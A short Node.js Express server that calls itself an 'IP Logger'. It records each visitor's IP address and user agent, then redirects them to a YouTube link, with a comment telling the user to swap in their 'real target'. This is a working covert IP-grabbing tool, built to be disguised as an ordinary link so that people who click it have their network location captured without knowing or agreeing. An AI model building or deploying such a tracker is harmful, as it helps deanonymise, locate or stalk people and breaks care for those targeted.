const express = require('express');
const fs = require('fs');
const app = express();

app.get('/', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const log = `${new Date().toISOString()} - IP: ${ip}, UA: ${userAgent}\n`;

    // fs.appendFile('ip-log.txt', log, (err) => {
    //     if (err) console.error('Failed to log IP:', err);
    // });
    console.log(`[User Log] Visitor IP: ${ip} at ${new Date().toISOString()}`);

    // Redirect after logging
    res.redirect('https://youtube.com/shorts/q3Nj9ZMSw4I?si=UQkW4aiFcjz7BKgi'); // change this to your real target
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`IP Logger running on port ${PORT}`);
});